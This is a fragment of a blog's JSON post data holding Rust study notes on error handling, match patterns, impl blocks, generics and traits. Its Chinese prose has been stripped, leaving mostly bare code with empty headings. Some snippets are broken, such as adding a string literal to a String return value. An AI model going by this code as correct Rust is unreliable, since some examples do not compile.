</p>\n<p>Rust </p>\n<ul>\n<li><strong></strong></li>\n<li><strong></strong></li>\n</ul>\n<p>Rust  Rust <code>Result&lt;T, E&gt;</code> <code>panic!</code> </p>\n<p> Rust Crouse</p>\n</blockquote>\n<p><code>panic!</code><code>Result</code>Rusttry catch</p>\n<p>rustgojavakotlinResult API~</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token comment\">// expect  panic!</span>\n<span class=\"token keyword\">let</span> guess <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">::</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">i32</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not a number!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// go</span>\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">let</span> guess <span class=\"token operator\">=</span> <span class=\"token string\">\"42\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">::</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">i32</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">match</span> guess <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You guessed: &#123;&#125;\"</span><span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Err</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Error: &#123;&#125;\"</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>rust<code>?</code>Result</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">use</span> <span class=\"token namespace\">core<span class=\"token punctuation\">::</span></span>time<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">use</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span><span class=\"token punctuation\">&#123;</span><span class=\"token namespace\">fs<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">OpenOptions</span><span class=\"token punctuation\">,</span> thread<span class=\"token punctuation\">,</span> <span class=\"token namespace\">io<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Write</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>io<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Result</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> f <span class=\"token operator\">=</span> <span class=\"token class-name\">OpenOptions</span><span class=\"token punctuation\">::</span><span class=\"token function\">new</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// &lt;-</span>\n    <span class=\"token macro property\">print!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;:?&#125; \\n\"</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// on the moment, manually remove the file hello.txt</span>\n    <span class=\"token keyword\">let</span> ten_millis <span class=\"token operator\">=</span> <span class=\"token namespace\">time<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Duration</span><span class=\"token punctuation\">::</span><span class=\"token function\">from_millis</span><span class=\"token punctuation\">(</span><span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token namespace\">thread<span class=\"token punctuation\">::</span></span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span>ten_millis<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token macro property\">print!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;:?&#125; \\n\"</span><span class=\"token punctuation\">,</span> f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">let</span> r <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span><span class=\"token function\">write_all</span><span class=\"token punctuation\">(</span><span class=\"token string\">b\"Hello, world!\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token punctuation\">;</span>\n    <span class=\"token macro property\">print!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Result is &#123;:?&#125; \\n\"</span><span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">drop</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>?</code></p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">let</span> f <span class=\"token operator\">=</span> <span class=\"token class-name\">OpenOptions</span><span class=\"token punctuation\">::</span><span class=\"token function\">new</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> <span class=\"token keyword\">mut</span> f <span class=\"token operator\">=</span> <span class=\"token keyword\">match</span> f<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> file<span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Err</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">return</span> <span class=\"token class-name\">Err</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p></p>\n<p>rust</p>\n<p></p>\n<blockquote>\n<p><code>panic::catch_unwind</code></p>\n<p></p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">use</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span>panic<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">let</span> result <span class=\"token operator\">=</span> <span class=\"token namespace\">panic<span class=\"token punctuation\">::</span></span><span class=\"token function\">catch_unwind</span><span class=\"token punctuation\">(</span><span class=\"token closure-params\"><span class=\"token closure-punctuation punctuation\">|</span><span class=\"token closure-punctuation punctuation\">|</span></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\">assert!</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">.</span><span class=\"token function\">is_ok</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">let</span> result <span class=\"token operator\">=</span> <span class=\"token namespace\">panic<span class=\"token punctuation\">::</span></span><span class=\"token function\">catch_unwind</span><span class=\"token punctuation\">(</span><span class=\"token closure-params\"><span class=\"token closure-punctuation punctuation\">|</span><span class=\"token closure-punctuation punctuation\">|</span></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">panic!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"oh no!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\">assert!</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">.</span><span class=\"token function\">is_err</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>try&#x2F;catchpanicErrRusttry&#x2F;catchRustthrow<strong>Result</strong></p>\n<p>catch_unwindunwindpanicpanic</p>\n<p><a href=\"https://link.zhihu.com/?target=https://doc.rust-lang.org/beta/std/panic/fn.catch_unwind.html\">Rust Documentation</a></p>\n</blockquote>\n"},{"title":"Rust","date":"2022-05-01T00:00:00.000Z","author":"","hide":false,"summary":"&&&&trait","_content":"\n# Rust\n\n## \n\ngoif for\n\n~~~rust\n// kotlin\nlet condition = true;\nlet number = if condition {\n        5\n    } else {\n        6\n    };\n\n// \nlet n = 6;\n\nif n % 4 == 0 {\n    println!(\"number is divisible by 4\");\n} else if n % 3 == 0 {\n    println!(\"number is divisible by 3\");\n} else if n % 2 == 0 {\n    println!(\"number is divisible by 2\");\n} else {\n    println!(\"number is not divisible by 4, 3, or 2\");\n}\n\n// for\n// kt, \nfor i in 1..=5 {\n   println!(\"{}\", i);\n}\n\n// \n// container\nfor item in &container {\n  // ...\n}\n\n// \nfor item in &mut collection {\n  // ...\n}\n\n// index\nlet a = [4, 3, 2, 1];\n// `.iter()`  `a` \nfor (i, v) in a.iter().enumerate() {\n   println!(\"{}{}\", i + 1, v);\n}\n\n//  while(true)\nloop {\n   println!(\"again!\");\n}\n~~~\n\n> rustbreak\n>\n> loop\n\n## \n\n> rust\n\n### match\n\n~~~rust\n// switch\n// matchswitch\nenum Coin {\n    Penny,\n    Nickel,\n    Dime,\n    Quarter,\n}\n\nfn value_in_cents(coin: Coin) -> u8 {\n    match coin {\n        Coin::Penny =>  {\n            println!(\"Lucky penny!\");\n            1\n        },\n        Coin::Nickel => 5,\n        Coin::Dime => 10,\n        Coin::Quarter => 25,\n    }\n}\n\n// match\nenum IpAddr {\n   Ipv4,\n   Ipv6\n}\n\nfn main() {\n    let ip1 = IpAddr::Ipv6;\n    let ip_str = match ip1 {\n        IpAddr::Ipv4 => \"127.0.0.1\",\n        _ => \"::1\",\n    };\n\n    println!(\"{}\", ip_str);\n}\n\n//  \nenum Coin {\n    Penny,\n    Nickel,\n    Dime,\n    Quarter(UsState), // 25\n}\n\nfn value_in_cents(coin: Coin) -> u8 {\n    match coin {\n        Coin::Penny => 1,\n        Coin::Nickel => 5,\n        Coin::Dime => 10,\n        // state\n        Coin::Quarter(state) => {\n            println!(\"State quarter from {:?}!\", state);\n            25\n        },\n    }\n}\n\n//  match \nlet v = Some(3u8);\nmatch v {\n   Some(3) => println!(\"three\"),\n   _ => (),\n}\n\n// \nif let Some(3) = v {\n    println!(\"three\");\n}\n~~~\n\n> match_ =>\n\n### matches!\n\n> javaString#matchesmacth,matches!\n\n~~~rust\n// match\nlet foo = 'f';\nlet matched = match foo {\n    'A'..'Z' | 'a'..'z' => true,\n    _ => false,\n}\n\n// matches!\nlet foo = 'f';\nlet matched = matches!(foo, 'A'..'Z' | 'a'..'z');\n~~~\n\n### \n\n\n\n### \n\n> if condition\n\n~~~rust\nfn main() {\n    let x = Some(5);\n    let y = 10;\n\n    match x {\n        Some(50) => println!(\"Got 50\"),\n        Some(n) if n == y => println!(\"Matched, n = {}\", n),\n        _ => println!(\"Default case, x = {:?}\", x),\n    }\n\n    println!(\"at the end: x = {:?}, y = {}\", x, y);\n}\n~~~\n\n> ****\n\n~~~rust\nlet x = 4;\nlet y = false;\n\nmatch x {\n    4 | 5 | 6 if y => println!(\"yes\"),\n    _ => println!(\"no\"),\n}\n~~~\n\n>  `if y`  `6` `if y`  `4``5` **** `6`  `x`  `4 | 5 | 6`  `y`  `true`\n\n### @\n\n> \n>\n>  \n\n~~~rust\nenum Message {\n    Hello { id: i32 },\n}\n\nlet msg = Message::Hello { id: 5 };\n\nmatch msg {\n    Message::Hello { id: id_variable @ 3..=7 } => {\n        println!(\"Found an id in range: {}\", id_variable)\n    },\n    Message::Hello { id: 10..=12 } => {\n        println!(\"Found an id in another range\")\n    },\n    Message::Hello { id } => {\n        println!(\"Found some other id: {}\", id)\n    },\n}\n~~~\n\nid: 3..=7\n\n:\n\n> :\n>\n> ```rust\n> fn main() {\n>     match 1 {\n>         num @ 1 | 2 => {\n>             println!(\"{}\", num);\n>         }\n>         _ => {}\n>     }\n> }\n> ```\n>\n>  `num`  `1`\n>\n> ```rust\n> num @ (1 | 2)\n> ```\n>\n>  Rust 1.53 \n\n## \n\nRust`impl`\n\n~~~rust\nstruct Circle {\n    x: f64,\n    y: f64,\n    radius: f64,\n}\n\nimpl Circle {\n    // newCircleself\n    // \n    fn new(x: f64, y: f64, radius: f64) -> Circle {\n        Circle {\n            x: x,\n            y: y,\n            radius: radius,\n        }\n    }\n\n    // Circle&selfCircle\n    fn area(&self) -> f64 {\n        std::f64::consts::PI * (self.radius * self.radius)\n    }\n}\n~~~\n\njavajavastructimpl\n\nimpl\n\n~~~rust\nstruct Circle {\n    x: f64,\n    y: f64,\n    radius: f64,\n}\n\nimpl Circle {\n    fn new(x: f64, y: f64, radius: f64) -> Circle {\n        Circle {\n            x: x,\n            y: y,\n            radius: radius,\n        }\n    }\n}\n\nimpl Circle {\n    fn area(&self) -> f64 {\n        std::f64::consts::PI * (self.radius * self.radius)\n    }\n}\n~~~\n\nimpl\n\n### &\n\n````\n\n\n\n~~~rust\nstruct Circle {\n    x: f64,\n    y: f64,\n    radius: f64,\n}\n\nimpl Circle {\n    // newCircleself\n    // \n    fn new(x: f64, y: f64, radius: f64) -> Circle {\n        Circle {\n            x: x,\n            y: y,\n            radius: radius,\n        }\n    }\n\n    // Circle&selfCircle\n    fn area(&self) -> f64 {\n        std::f64::consts::PI * (self.radius * self.radius)\n    }\n}\n~~~\n\n`&self` `self: &Self` `circle.area()`\n\n****\n\n### \n\n~~~rust\n#![allow(unused)]\nfn main() {\nenum Message {\n    Quit,\n    Move { x: i32, y: i32 },\n    Write(String),\n    ChangeColor(i32, i32, i32),\n}\n\nimpl Message {\n    fn call(&self) {\n        // \n    }\n}\n\n\tlet m = Message::Write(String::from(\"hello\"));\n\tm.call();\n}\n~~~\n\n## &(trait)\n\n### \n\n~~~rust\nfn add<T>(a:T, b:T) -> T {\n    a + b\n}\n\nfn main() {\n    println!(\"add i8: {}\", add(2i8, 3i8));\n    println!(\"add i32: {}\", add(20, 30));\n    println!(\"add f64: {}\", add(1.23, 1.23));\n}\n~~~\n\n\n\n### trait\n\n\n\nkotlin\n\n~~~rust\nfn add<T: std::ops::Add<Output = T>>(a:T, b:T) -> T {\n    a + b\n}\n~~~\n\n`std::ops::Add<Output = T>`kotlinrust`trait `,`std::ops::Add<Output = T>`,output\n\n> ****\n\n### \n\n~~~rust\nenum Option<T> {\n    Some(T),\n    None,\n}\n\nenum Result<T, E> {\n    Ok(T),\n    Err(E),\n}\n~~~\n\n### \n\n~~~rust\nstruct Point<T> {\n    x: T,\n    y: T,\n}\n\nimpl<T> Point<T> {\n    fn x(&self) -> &T {\n        &self.x\n    }\n}\n\nfn main() {\n    let p = Point { x: 5, y: 10 };\n\n    println!(\"p.x = {}\", p.x());\n}\n~~~\n\n> `T,U`  `Point` `V,W`  `mixup` \n\n### \n\n>  `Point<T>`  `T` \n>\n> ```rust\n> impl Point<f32> {\n>     fn distance_from_origin(&self) -> f32 {\n>         (self.x.powi(2) + self.y.powi(2)).sqrt()\n>     }\n> }\n> ```\n>\n>  `Point<f32>`  `distance_from_origin` `T`  `f32`  `Point<T> ``(0.0, 0.0)` \n>\n> \n\n### const \n\n~~~rust\nfn display_array<T: std::fmt::Debug>(arr: &[T]) {\n    println!(\"{:?}\", arr);\n}\nfn main() {\n    let arr: [i32; 3] = [1, 2, 3];\n    display_array(&arr);\n\n    let arr: [i32;2] = [1,2];\n    display_array(&arr);\n}\n~~~\n\n\n\nconst\n\n~~~rust\nfn display_array<T: std::fmt::Debug, const N: usize>(arr: [T; N]) {\n    println!(\"{:?}\", arr);\n}\nfn main() {\n    let arr: [i32; 3] = [1, 2, 3];\n    display_array(arr);\n\n    let arr: [i32; 2] = [1, 2];\n    display_array(arr);\n}\n~~~\n\nusizeusize\n\n### \n\n>  Rust \n>\n> Rust \n>\n> \n>\n> Rust  ****(*monomorphization*)\n>\n> \n\n## (trait)\n\njavainterface\n\n### \n\n~~~rust\npub trait Summary {\n    fn summarize(&self) -> String;\n    \n    // \n    // \n    fn summarize1(&self) -> String {\n        \"\" + self.summarize()\n    }\n}\n~~~\n\n### \n\n~~~rust\npub trait Summary {\n    fn summarize(&self) -> String;\n}\npub struct Post {\n    pub title: String, // \n    pub author: String, // \n    pub content: String, // \n}\n\nimpl Summary for Post {\n    fn summarize(&self) -> String {\n        format!(\"{}, {}\", self.title, self.author)\n    }\n}\n\npub struct Weibo {\n    pub username: String,\n    pub content: String\n}\n\nimpl Summary for Weibo {\n    fn summarize(&self) -> String {\n        format!(\"{}{}\", self.username, self.content)\n    }\n}\n~~~\n\nRustKotlin\n\n### \n\n>  `Summary`  `pub`  `Summary` \n>\n> ** `A`  `T` `A`  `T` ** `Post`  `Display`  `Post`  `String`  `Summary`  `Summary` \n>\n>  `String`  `Display` \n>\n> ****\n\n### \n\n~~~rust\npub fn notify(item: &impl Summary) {\n    println!(\"Breaking news! {}\", item.summarize());\n}\n\n// \npub fn notify(item: &(impl Summary + Display)) {\n    //...\n}\n\n// where\nfn some_function<T: Display + Clone, U: Clone + Debug>(t: &T, u: &U) -> i32 {\n    //...\n}\n\n// where\nfn some_function<T, U>(t: &T, u: &U) -> i32\n    where T: Display + Clone,\n          U: Clone + Debug\n{\n    //...\n}\n~~~\n\n>  `impl Trait` \n>\n> ```rust\n> pub fn notify<T: Summary>(item: &T) {\n>     println!(\"Breaking news! {}\", item.summarize());\n> }\n> ```\n\n// TODO","source":"_posts/rust-note-#2.md","raw":"---\ntitle: Rust\ndate: 2022-05\nauthor: \nhide: false\nsummary: &&&&trait\ncategories: \ntags:\n  - Rust\n  - Rust\n---\n\n# Rust\n\n## \n\ngoif for\n\n~~~rust\n// kotlin\nlet condition = true;\nlet number = if condition {\n        5\n    } else {\n        6\n    };\n\n// \nlet n = 6;\n\nif n % 4 == 0 {\n    println!(\"number is divisible by 4\");\n} else if n % 3 == 0 {\n    println!(\"number is divisible by 3\");\n} else if n % 2 == 0 {\n    println!(\"number is divisible by 2\");\n} else {\n    println!(\"number is not divisible by 4, 3, or 2\");\n}\n\n// for\n// kt, \nfor i in 1..=5 {\n   println!(\"{}\", i);\n}\n\n// \n// container\nfor item in &container {\n  // ...\n}\n\n// \nfor item in &mut collection {\n  // ...\n}\n\n// index\nlet a = [4, 3, 2, 1];\n// `.iter()`  `a` \nfor (i, v) in a.iter().enumerate() {\n   println!(\"{}{}\", i + 1, v);\n}\n\n//  while(true)\nloop {\n   println!(\"again!\");\n}\n~~~\n\n> rustbreak\n>\n> loop\n\n## \n\n> rust\n\n### match\n\n~~~rust\n// switch\n// matchswitch\nenum Coin {\n    Penny,\n    Nickel,\n    Dime,\n    Quarter,\n}\n\nfn value_in_cents(coin: Coin) -> u8 {\n    match coin {\n        Coin::Penny =>  {\n            println!(\"Lucky penny!\");\n            1\n        },\n        Coin::Nickel => 5,\n        Coin::Dime => 10,\n        Coin::Quarter => 25,\n    }\n}\n\n// match\nenum IpAddr {\n   Ipv4,\n   Ipv6\n}\n\nfn main() {\n    let ip1 = IpAddr::Ipv6;\n    let ip_str = match ip1 {\n        IpAddr::Ipv4 => \"127.0.0.1\",\n        _ => \"::1\",\n    };\n\n    println!(\"{}\", ip_str);\n}\n\n//  \nenum Coin {\n    Penny,\n    Nickel,\n    Dime,\n    Quarter(UsState), // 25\n}\n\nfn value_in_cents(coin: Coin) -> u8 {\n    match coin {\n        Coin::Penny => 1,\n        Coin::Nickel => 5,\n        Coin::Dime => 10,\n        // state\n        Coin::Quarter(state) => {\n            println!(\"State quarter from {:?}!\", state);\n            25\n        },\n    }\n}\n\n//  match \nlet v = Some(3u8);\nmatch v {\n   Some(3) => println!(\"three\"),\n   _ => (),\n}\n\n// \nif let Some(3) = v {\n    println!(\"three\");\n}\n~~~\n\n> match_ =>\n\n### matches!\n\n> javaString#matchesmacth,matches!\n\n~~~rust\n// match\nlet foo = 'f';\nlet matched = match foo {\n    'A'..'Z' | 'a'..'z' => true,\n    _ => false,\n}\n\n// matches!\nlet foo = 'f';\nlet matched = matches!(foo, 'A'..'Z' | 'a'..'z');\n~~~\n\n### \n\n\n\n### \n\n> if condition\n\n~~~rust\nfn main() {\n    let x = Some(5);\n    let y = 10;\n\n    match x {\n        Some(50) => println!(\"Got 50\"),\n        Some(n) if n == y => println!(\"Matched, n = {}\", n),\n        _ => println!(\"Default case, x = {:?}\", x),\n    }\n\n    println!(\"at the end: x = {:?}, y = {}\", x, y);\n}\n~~~\n\n> ****\n\n~~~rust\nlet x = 4;\nlet y = false;\n\nmatch x {\n    4 | 5 | 6 if y => println!(\"yes\"),\n    _ => println!(\"no\"),\n}\n~~~\n\n>  `if y`  `6` `if y`  `4``5` **** `6`  `x`  `4 | 5 | 6`  `y`  `true`\n\n### @\n\n> \n>\n>  \n\n~~~rust\nenum Message {\n    Hello { id: i32 },\n}\n\nlet msg = Message::Hello { id: 5 };\n\nmatch msg {\n    Message::Hello { id: id_variable @ 3..=7 } => {\n        println!(\"Found an id in range: {}\", id_variable)\n    },\n    Message::Hello { id: 10..=12 } => {\n        println!(\"Found an id in another range\")\n    },\n    Message::Hello { id } => {\n        println!(\"Found some other id: {}\", id)\n    },\n}\n~~~\n\nid: 3..=7\n\n:\n\n> :\n>\n> ```rust\n> fn main() {\n>     match 1 {\n>         num @ 1 | 2 => {\n>             println!(\"{}\", num);\n>         }\n>         _ => {}\n>     }\n> }\n> ```\n>\n>  `num`  `1`\n>\n> ```rust\n> num @ (1 | 2)\n> ```\n>\n>  Rust 1.53 \n\n## \n\nRust`impl`\n\n~~~rust\nstruct Circle {\n    x: f64,\n    y: f64,\n    radius: f64,\n}\n\nimpl Circle {\n    // newCircleself\n    // \n    fn new(x: f64, y: f64, radius: f64) -> Circle {\n        Circle {\n            x: x,\n            y: y,\n            radius: radius,\n        }\n    }\n\n    // Circle&selfCircle\n    fn area(&self) -> f64 {\n        std::f64::consts::PI * (self.radius * self.radius)\n    }\n}\n~~~\n\njavajavastructimpl\n\nimpl\n\n~~~rust\nstruct Circle {\n    x: f64,\n    y: f64,\n    radius: f64,\n}\n\nimpl Circle {\n    fn new(x: f64, y: f64, radius: f64) -> Circle {\n        Circle {\n            x: x,\n            y: y,\n            radius: radius,\n        }\n    }\n}\n\nimpl Circle {\n    fn area(&self) -> f64 {\n        std::f64::consts::PI * (self.radius * self.radius)\n    }\n}\n~~~\n\nimpl\n\n### &\n\n````\n\n\n\n~~~rust\nstruct Circle {\n    x: f64,\n    y: f64,\n    radius: f64,\n}\n\nimpl Circle {\n    // newCircleself\n    // \n    fn new(x: f64, y: f64, radius: f64) -> Circle {\n        Circle {\n            x: x,\n            y: y,\n            radius: radius,\n        }\n    }\n\n    // Circle&selfCircle\n    fn area(&self) -> f64 {\n        std::f64::consts::PI * (self.radius * self.radius)\n    }\n}\n~~~\n\n`&self` `self: &Self` `circle.area()`\n\n****\n\n### \n\n~~~rust\n#![allow(unused)]\nfn main() {\nenum Message {\n    Quit,\n    Move { x: i32, y: i32 },\n    Write(String),\n    ChangeColor(i32, i32, i32),\n}\n\nimpl Message {\n    fn call(&self) {\n        // \n    }\n}\n\n\tlet m = Message::Write(String::from(\"hello\"));\n\tm.call();\n}\n~~~\n\n## &(trait)\n\n### \n\n~~~rust\nfn add<T>(a:T, b:T) -> T {\n    a + b\n}\n\nfn main() {\n    println!(\"add i8: {}\", add(2i8, 3i8));\n    println!(\"add i32: {}\", add(20, 30));\n    println!(\"add f64: {}\", add(1.23, 1.23));\n}\n~~~\n\n\n\n### trait\n\n\n\nkotlin\n\n~~~rust\nfn add<T: std::ops::Add<Output = T>>(a:T, b:T) -> T {\n    a + b\n}\n~~~\n\n`std::ops::Add<Output = T>`kotlinrust`trait `,`std::ops::Add<Output = T>`,output\n\n> ****\n\n### \n\n~~~rust\nenum Option<T> {\n    Some(T),\n    None,\n}\n\nenum Result<T, E> {\n    Ok(T),\n    Err(E),\n}\n~~~\n\n### \n\n~~~rust\nstruct Point<T> {\n    x: T,\n    y: T,\n}\n\nimpl<T> Point<T> {\n    fn x(&self) -> &T {\n        &self.x\n    }\n}\n\nfn main() {\n    let p = Point { x: 5, y: 10 };\n\n    println!(\"p.x = {}\", p.x());\n}\n~~~\n\n> `T,U`  `Point` `V,W`  `mixup` \n\n### \n\n>  `Point<T>`  `T` \n>\n> ```rust\n> impl Point<f32> {\n>     fn distance_from_origin(&self) -> f32 {\n>         (self.x.powi(2) + self.y.powi(2)).sqrt()\n>     }\n> }\n> ```\n>\n>  `Point<f32>`  `distance_from_origin` `T`  `f32`  `Point<T> ``(0.0, 0.0)` \n>\n> \n\n### const \n\n~~~rust\nfn display_array<T: std::fmt::Debug>(arr: &[T]) {\n    println!(\"{:?}\", arr);\n}\nfn main() {\n    let arr: [i32; 3] = [1, 2, 3];\n    display_array(&arr);\n\n    let arr: [i32;2] = [1,2];\n    display_array(&arr);\n}\n~~~\n\n\n\nconst\n\n~~~rust\nfn display_array<T: std::fmt::Debug, const N: usize>(arr: [T; N]) {\n    println!(\"{:?}\", arr);\n}\nfn main() {\n    let arr: [i32; 3] = [1, 2, 3];\n    display_array(arr);\n\n    let arr: [i32; 2] = [1, 2];\n    display_array(arr);\n}\n~~~\n\nusizeusize\n\n### \n\n>  Rust \n>\n> Rust \n>\n> \n>\n> Rust  ****(*monomorphization*)\n>\n> \n\n## (trait)\n\njavainterface\n\n### \n\n~~~rust\npub trait Summary {\n    fn summarize(&self) -> String;\n    \n    // \n    // \n    fn summarize1(&self) -> String {\n        \"\" + self.summarize()\n    }\n}\n~~~\n\n### \n\n~~~rust\npub trait Summary {\n    fn summarize(&self) -> String;\n}\npub struct Post {\n    pub title: String, // \n    pub author: String, // \n    pub content: String, // \n}\n\nimpl Summary for Post {\n    fn summarize(&self) -> String {\n        format!(\"{}, {}\", self.title, self.author)\n    }\n}\n\npub struct Weibo {\n    pub username: String,\n    pub content: String\n}\n\nimpl Summary for Weibo {\n    fn summarize(&self) -> String {\n        format!(\"{}{}\", self.username, self.content)\n    }\n}\n~~~\n\nRustKotlin\n\n### \n\n>  `Summary`  `pub`  `Summary` \n>\n> ** `A`  `T` `A`  `T` ** `Post`  `Display`  `Post`  `String`  `Summary`  `Summary` \n>\n>  `String`  `Display` \n>\n> ****\n\n### \n\n~~~rust\npub fn notify(item: &impl Summary) {\n    println!(\"Breaking news! {}\", item.summarize());\n}\n\n// \npub fn notify(item: &(impl Summary + Display)) {\n    //...\n}\n\n// where\nfn some_function<T: Display + Clone, U: Clone + Debug>(t: &T, u: &U) -> i32 {\n    //...\n}\n\n// where\nfn some_function<T, U>(t: &T, u: &U) -> i32\n    where T: Display + Clone,\n          U: Clone + Debug\n{\n    //...\n}\n~~~\n\n>  `impl Trait` \n>\n> ```rust\n> pub fn notify<T: Summary>(item: &T) {\n>     println!(\"Breaking news! {}\", item.summarize());\n> }\n> ```\n\n// TODO","slug":"rust-note-#2","published":1,"updated":"2022-11-24T02:43:05.727Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtu002esfklfuouehul","content":"<h1 id=\"Rust\"><a href=\"#Rust\" class=\"headerlink\" title=\"Rust\"></a>Rust</h1><h2 id=\"\"><a 